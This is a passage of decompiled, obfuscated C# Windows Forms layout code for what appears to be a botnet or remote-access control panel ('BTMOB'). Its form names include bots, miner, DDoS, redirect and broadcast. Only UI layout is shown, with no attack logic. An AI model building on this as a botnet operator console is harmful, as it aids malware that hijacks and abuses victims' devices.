		this.ClitopView.Dock = System.Windows.Forms.DockStyle.Top;
		this.ClitopView.Location = new System.Drawing.Point(0, 0);
		this.ClitopView.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.ClitopView.Name = EXGuarder._16741141;
		this.ClitopView.Size = new System.Drawing.Size(1450, 84);
		this.ClitopView.TabIndex = 44;
		this.ClitopView.ZoomFactor = 1.0;
		this.homepanel.Controls.Add(this.homeview);
		this.homepanel.Dock = System.Windows.Forms.DockStyle.Fill;
		this.homepanel.Location = new System.Drawing.Point(0, 0);
		this.homepanel.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.homepanel.Name = EXGuarder._5A00162E;
		this.homepanel.Size = new System.Drawing.Size(1450, 808);
		this.homepanel.TabIndex = 44;
		this.homeview.AllowExternalDrop = true;
		this.homeview.CreationProperties = null;
		this.homeview.DefaultBackgroundColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.homeview.Dock = System.Windows.Forms.DockStyle.Fill;
		this.homeview.Location = new System.Drawing.Point(0, 0);
		this.homeview.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.homeview.Name = EXGuarder._7820403E;
		this.homeview.Size = new System.Drawing.Size(1450, 808);
		this.homeview.TabIndex = 0;
		this.homeview.ZoomFactor = 1.0;
		this.Panel_updates.Controls.Add(this.mywebview);
		this.Panel_updates.Controls.Add(this.updateview);
		this.Panel_updates.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Panel_updates.Location = new System.Drawing.Point(0, 0);
		this.Panel_updates.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.Panel_updates.Name = EXGuarder._770C113A;
		this.Panel_updates.Padding = new System.Windows.Forms.Padding(1);
		this.Panel_updates.Size = new System.Drawing.Size(1450, 808);
		this.Panel_updates.TabIndex = 9;
		this.mywebview.AllowExternalDrop = true;
		this.mywebview.CreationProperties = null;
		this.mywebview.DefaultBackgroundColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.mywebview.Dock = System.Windows.Forms.DockStyle.Fill;
		this.mywebview.Location = new System.Drawing.Point(1, 186);
		this.mywebview.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.mywebview.Name = EXGuarder._66283D78;
		this.mywebview.Size = new System.Drawing.Size(1448, 621);
		this.mywebview.TabIndex = 1;
		this.mywebview.ZoomFactor = 1.0;
		this.updateview.AllowExternalDrop = true;
		this.updateview.CreationProperties = null;
		this.updateview.DefaultBackgroundColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.updateview.Dock = System.Windows.Forms.DockStyle.Top;
		this.updateview.Location = new System.Drawing.Point(1, 1);
		this.updateview.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.updateview.Name = EXGuarder._71283F02;
		this.updateview.Size = new System.Drawing.Size(1448, 185);
		this.updateview.TabIndex = 2;
		this.updateview.ZoomFactor = 1.0;
		this.panel_list_block.Controls.Add(this.blockview);
		this.panel_list_block.Dock = System.Windows.Forms.DockStyle.Fill;
		this.panel_list_block.Location = new System.Drawing.Point(0, 0);
		this.panel_list_block.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.panel_list_block.Name = EXGuarder._201A3550;
		this.panel_list_block.Padding = new System.Windows.Forms.Padding(1);
		this.panel_list_block.Size = new System.Drawing.Size(1450, 808);
		this.panel_list_block.TabIndex = 7;
		this.blockview.AllowExternalDrop = true;
		this.blockview.CreationProperties = null;
		this.blockview.DefaultBackgroundColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.blockview.Dock = System.Windows.Forms.DockStyle.Fill;
		this.blockview.Location = new System.Drawing.Point(1, 1);
		this.blockview.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.blockview.Name = EXGuarder._763A5454;
		this.blockview.Size = new System.Drawing.Size(1448, 806);
		this.blockview.TabIndex = 0;
		this.blockview.ZoomFactor = 1.0;
		this.panel_CONLIST.Controls.Add(this.ConView);
		this.panel_CONLIST.Dock = System.Windows.Forms.DockStyle.Fill;
		this.panel_CONLIST.Location = new System.Drawing.Point(0, 0);
		this.panel_CONLIST.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.panel_CONLIST.Name = EXGuarder._3C04603D;
		this.panel_CONLIST.Padding = new System.Windows.Forms.Padding(1);
		this.panel_CONLIST.Size = new System.Drawing.Size(1450, 808);
		this.panel_CONLIST.TabIndex = 6;
		this.ConView.AllowExternalDrop = true;
		this.ConView.CreationProperties = null;
		this.ConView.DefaultBackgroundColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.ConView.Dock = System.Windows.Forms.DockStyle.Fill;
		this.ConView.Location = new System.Drawing.Point(1, 1);
		this.ConView.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.ConView.Name = EXGuarder._0A4A442A;
		this.ConView.Size = new System.Drawing.Size(1448, 806);
		this.ConView.TabIndex = 0;
		this.ConView.ZoomFactor = 1.0;
		this.panel_notifys.Controls.Add(this.NotifyVew);
		this.panel_notifys.Dock = System.Windows.Forms.DockStyle.Fill;
		this.panel_notifys.Location = new System.Drawing.Point(0, 0);
		this.panel_notifys.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.panel_notifys.Name = EXGuarder._193E114B;
		this.panel_notifys.Padding = new System.Windows.Forms.Padding(1);
		this.panel_notifys.Size = new System.Drawing.Size(1450, 808);
		this.panel_notifys.TabIndex = 7;
		this.NotifyVew.AllowExternalDrop = true;
		this.NotifyVew.CreationProperties = null;
		this.NotifyVew.DefaultBackgroundColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.NotifyVew.Dock = System.Windows.Forms.DockStyle.Fill;
		this.NotifyVew.Location = new System.Drawing.Point(1, 1);
		this.NotifyVew.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.NotifyVew.Name = EXGuarder._1B72416D;
		this.NotifyVew.Size = new System.Drawing.Size(1448, 806);
		this.NotifyVew.TabIndex = 0;
		this.NotifyVew.ZoomFactor = 1.0;
		this.Panel_screens.Controls.Add(this.FlowLayoutPanel1);
		this.Panel_screens.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Panel_screens.Location = new System.Drawing.Point(0, 0);
		this.Panel_screens.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.Panel_screens.Name = EXGuarder._38047032;
		this.Panel_screens.Size = new System.Drawing.Size(1450, 808);
		this.Panel_screens.TabIndex = 6;
		this.FlowLayoutPanel1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.FlowLayoutPanel1.Location = new System.Drawing.Point(0, 0);
		this.FlowLayoutPanel1.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.FlowLayoutPanel1.Name = EXGuarder._2623205F;
		this.FlowLayoutPanel1.Padding = new System.Windows.Forms.Padding(11, 10, 11, 10);
		this.FlowLayoutPanel1.Size = new System.Drawing.Size(1450, 808);
		this.FlowLayoutPanel1.TabIndex = 0;
		this.ctx_cons.BackColor = System.Drawing.Color.FromArgb(207, 216, 220);
		this.ctx_cons.Font = new System.Drawing.Font(EXGuarder._4A6D031B, 9f);
		this.ctx_cons.ImageScalingSize = new System.Drawing.Size(20, 20);
		this.ctx_cons.Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { this.ClearAllToolStripMenuItem });
		this.ctx_cons.Name = EXGuarder._21607748;
		this.ctx_cons.Size = new System.Drawing.Size(153, 30);
		this.ctx_cons.Style = DrakeUI.Framework.UIStyle.Black;
		this.ctx_cons.StyleCustomMode = true;
		this.ClearAllToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.ClearAllToolStripMenuItem.ForeColor = System.Drawing.Color.White;
		this.ClearAllToolStripMenuItem.Image = BTMOB.My.Resources.Resources.clear;
		this.ClearAllToolStripMenuItem.Name = EXGuarder._1D150E25;
		this.ClearAllToolStripMenuItem.Size = new System.Drawing.Size(152, 26);
		this.ClearAllToolStripMenuItem.Text = EXGuarder._3B0A4B13;
		this.ctxnotify.BackColor = System.Drawing.Color.FromArgb(207, 216, 220);
		this.ctxnotify.Font = new System.Drawing.Font(EXGuarder._4A6D031B, 9f);
		this.ctxnotify.ImageScalingSize = new System.Drawing.Size(20, 20);
		this.ctxnotify.Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { this.ToolStripMenuItem17 });
		this.ctxnotify.Name = EXGuarder._21607748;
		this.ctxnotify.Size = new System.Drawing.Size(233, 30);
		this.ctxnotify.Style = DrakeUI.Framework.UIStyle.Black;
		this.ctxnotify.StyleCustomMode = true;
		this.ToolStripMenuItem17.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.ToolStripMenuItem17.ForeColor = System.Drawing.Color.White;
		this.ToolStripMenuItem17.Image = BTMOB.My.Resources.Resources.clear;
		this.ToolStripMenuItem17.Name = EXGuarder._24184D06;
		this.ToolStripMenuItem17.Size = new System.Drawing.Size(232, 26);
		this.ToolStripMenuItem17.Text = EXGuarder._0D5C4F09;
		this.DrakeWidth_W5.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.DrakeWidth_W5.Dock = System.Windows.Forms.DockStyle.Left;
		this.DrakeWidth_W5.Location = new System.Drawing.Point(0, 3);
		this.DrakeWidth_W5.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.DrakeWidth_W5.Name = EXGuarder._26333F71;
		this.DrakeWidth_W5.Size = new System.Drawing.Size(3, 881);
		this.DrakeWidth_W5.TabIndex = 25;
		this.DrakeWidth_W6.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.DrakeWidth_W6.Dock = System.Windows.Forms.DockStyle.Top;
		this.DrakeWidth_W6.Location = new System.Drawing.Point(0, 0);
		this.DrakeWidth_W6.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.DrakeWidth_W6.Name = EXGuarder._210C5A58;
		this.DrakeWidth_W6.Size = new System.Drawing.Size(1553, 3);
		this.DrakeWidth_W6.TabIndex = 24;
		this.BTtiptool.AutomaticDelay = 100;
		this.BTtiptool.AutoPopDelay = 1000;
		this.BTtiptool.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.BTtiptool.Font = new System.Drawing.Font(EXGuarder._4A6D031B, 9f);
		this.BTtiptool.ForeColor = System.Drawing.Color.FromArgb(2, 196, 117);
		this.BTtiptool.InitialDelay = 10;
		this.BTtiptool.OwnerDraw = true;
		this.BTtiptool.RectColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.BTtiptool.ReshowDelay = 20;
		this.BTtiptool.ShowAlways = true;
		this.BTtiptool.TitleFont = new System.Drawing.Font(EXGuarder._4A6D031B, 9f);
		this.BTtiptool.ToolTipIcon = System.Windows.Forms.ToolTipIcon.Info;
		this.BTtiptool.ToolTipTitle = EXGuarder._111E606A;
		this.hidbtn.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.hidbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.hidbtn.Dock = System.Windows.Forms.DockStyle.Right;
		this.hidbtn.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.hidbtn.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.hidbtn.FillPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.hidbtn.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.hidbtn.Font = new System.Drawing.Font(EXGuarder._4A6D031B, 16f, System.Drawing.FontStyle.Bold);
		this.hidbtn.ForeColor = System.Drawing.Color.FromArgb(109, 109, 103);
		this.hidbtn.ForeHoverColor = System.Drawing.Color.Cyan;
		this.hidbtn.Location = new System.Drawing.Point(1341, 4);
		this.hidbtn.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.hidbtn.Name = EXGuarder._6A481216;
		this.hidbtn.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.hidbtn.RectColor = System.Drawing.Color.FromArgb(64, 64, 64);
		this.hidbtn.RectDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.hidbtn.RectHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.hidbtn.RectPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.hidbtn.RectSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.hidbtn.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.hidbtn.Size = new System.Drawing.Size(35, 12);
		this.hidbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.hidbtn.Symbol = 61713;
		this.hidbtn.SymbolSize = 0;
		this.hidbtn.TabIndex = 4;
		this.hidbtn.Text = EXGuarder._60710645;
		this.BTtiptool.SetToolTip(this.hidbtn, EXGuarder._5524206C);
		this.minimizbtn.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.minimizbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.minimizbtn.Dock = System.Windows.Forms.DockStyle.Right;
		this.minimizbtn.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.minimizbtn.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.minimizbtn.FillPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.minimizbtn.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.minimizbtn.Font = new System.Drawing.Font(EXGuarder._4A6D031B, 16f, System.Drawing.FontStyle.Bold);
		this.minimizbtn.ForeColor = System.Drawing.Color.FromArgb(109, 109, 103);
		this.minimizbtn.ForeHoverColor = System.Drawing.Color.Lime;
		this.minimizbtn.Location = new System.Drawing.Point(1376, 4);
		this.minimizbtn.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.minimizbtn.Name = EXGuarder._77255E4C;
		this.minimizbtn.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.minimizbtn.RectColor = System.Drawing.Color.FromArgb(64, 64, 64);
		this.minimizbtn.RectDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.minimizbtn.RectHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.minimizbtn.RectPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.minimizbtn.RectSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.minimizbtn.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.minimizbtn.Size = new System.Drawing.Size(35, 12);
		this.minimizbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.minimizbtn.Symbol = 61713;
		this.minimizbtn.SymbolSize = 0;
		this.minimizbtn.TabIndex = 5;
		this.minimizbtn.Text = EXGuarder._60710645;
		this.BTtiptool.SetToolTip(this.minimizbtn, EXGuarder._306E4814);
		this.contimer.Interval = 1000;
		this.Panel1.Controls.Add(this.DashboardPanel);
		this.Panel1.Controls.Add(this.Panel9);
		this.Panel1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Panel1.Location = new System.Drawing.Point(103, 3);
		this.Panel1.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.Panel1.Name = EXGuarder._48403E72;
		this.Panel1.Size = new System.Drawing.Size(1450, 828);
		this.Panel1.TabIndex = 44;
		this.Panel9.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel9.Controls.Add(this.hidbtn);
		this.Panel9.Controls.Add(this.minimizbtn);
		this.Panel9.Controls.Add(this.btnExit);
		this.Panel9.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel9.Location = new System.Drawing.Point(0, 0);
		this.Panel9.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.Panel9.Name = EXGuarder._201E5C6E;
		this.Panel9.Padding = new System.Windows.Forms.Padding(4);
		this.Panel9.Size = new System.Drawing.Size(1450, 20);
		this.Panel9.TabIndex = 44;
		this.DrakeWidth_W7.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.DrakeWidth_W7.Cursor = System.Windows.Forms.Cursors.SizeWE;
		this.DrakeWidth_W7.Dock = System.Windows.Forms.DockStyle.Right;
		this.DrakeWidth_W7.Location = new System.Drawing.Point(1553, 0);
		this.DrakeWidth_W7.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.DrakeWidth_W7.Name = EXGuarder._58455C34;
		this.DrakeWidth_W7.Size = new System.Drawing.Size(3, 884);
		this.DrakeWidth_W7.TabIndex = 44;
		this.FadeInTimer.Interval = 1000;
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 16f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.AutoSizeMode = System.Windows.Forms.AutoSizeMode.GrowAndShrink;
		this.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		base.ClientSize = new System.Drawing.Size(1556, 884);
		base.Controls.Add(this.Panel1);
		base.Controls.Add(this.Panel3);
		base.Controls.Add(this.Panel2);
		base.Controls.Add(this.DrakeWidth_W2);
		base.Controls.Add(this.DrakeWidth_W5);
		base.Controls.Add(this.DrakeWidth_W6);
		base.Controls.Add(this.DrakeWidth_W7);
		this.DoubleBuffered = true;
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
		base.Icon = (System.Drawing.Icon)resources.GetObject(EXGuarder._71713F13);
		base.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.MinimumSize = new System.Drawing.Size(1220, 684);
		base.Name = EXGuarder._0B565766;
		base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
		this.Text = EXGuarder._2F473D4E;
		this.Panel2.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.stateview).EndInit();
		this.Panel3.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.navview).EndInit();
		((System.ComponentModel.ISupportInitialize)this.DGV0).EndInit();
		this.ctx_clients.ResumeLayout(false);
		this.DashboardPanel.ResumeLayout(false);
		this.DashboardPanel.PerformLayout();
		this.panel_DGV0.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.barview).EndInit();
		((System.ComponentModel.ISupportInitialize)this.ClitopView).EndInit();
		this.homepanel.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.homeview).EndInit();
		this.Panel_updates.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.mywebview).EndInit();
		((System.ComponentModel.ISupportInitialize)this.updateview).EndInit();
		this.panel_list_block.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.blockview).EndInit();
		this.panel_CONLIST.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.ConView).EndInit();
		this.panel_notifys.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.NotifyVew).EndInit();
		this.Panel_screens.ResumeLayout(false);
		this.ctx_cons.ResumeLayout(false);
		this.ctxnotify.ResumeLayout(false);
		this.Panel1.ResumeLayout(false);
		this.Panel9.ResumeLayout(false);
		base.ResumeLayout(false);
	}

	[SpecialName]
	[CompilerGenerated]
	private void _Lambda_0024__122_002D0()
	{
		broadcastform = null;
	}

	[SpecialName]
	[CompilerGenerated]
	private void _Lambda_0024__148_002D0()
	{
		redirectform = null;
	}

	[SpecialName]
	[CompilerGenerated]
	private void _Lambda_0024__166_002D0()
	{
		updateform = null;
	}

	[SpecialName]
	[CompilerGenerated]
	private void _Lambda_0024__170_002D0()
	{
		BotsForm = null;
	}

	[SpecialName]
	[CompilerGenerated]
	private void _Lambda_0024__172_002D0()
	{
		minerform = null;
	}

	[SpecialName]
	[CompilerGenerated]
	private void _Lambda_0024__174_002D0()
	{
		ddosform = null;
	}
}
